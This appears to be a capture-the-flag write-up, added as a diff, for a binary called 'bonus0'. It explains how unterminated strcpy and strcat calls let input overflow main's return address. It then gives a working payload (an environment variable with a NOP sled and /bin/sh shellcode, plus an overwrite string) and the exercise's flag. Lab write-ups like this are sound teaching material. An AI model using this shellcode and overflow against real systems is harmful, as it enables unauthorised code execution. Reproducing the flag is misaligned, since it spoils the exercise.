@@ -1,0 +1,8 @@
+We have 2 functions : "p" and "pp". The main function calls "pp" and gives a buffer with a size of 0x2a. "pp" has 2 buffers (size of 0x14) to store the user input. "p" reads on stdin, searches the "\n" character to replace it by the terminating NULL byte and strcpy 0x14 characters in the buffer given by "pp". "pp" copy the first buffer in the buffer of the main and concat it with the second buffer (with a space between them).
+
+We can exploit this program by writing 0x14 characters in the first call of "p" ("p" don't copy the terminating NULL byte which is in the second buffer). So when strcpy copy the first buffer, it copy the first buffer AND what's inside the second buffer. If we write enough characters in the second buffer, we can use a buffer overflow to rewrite the return of main and call a shellcode (in our environment for our payload). 
+Here's the payload:
+export SHELLCODE=`python -c 'print ("\x90" * 0xffff + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80")'`
+cat <(python -c 'print ("A" * 0x14 + "\x0a" + "A" * 0xfeb + "B" * 14 + "\x1e\xe9\xff\xbfA")') - | ./bonus0
+
+The flag is : cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
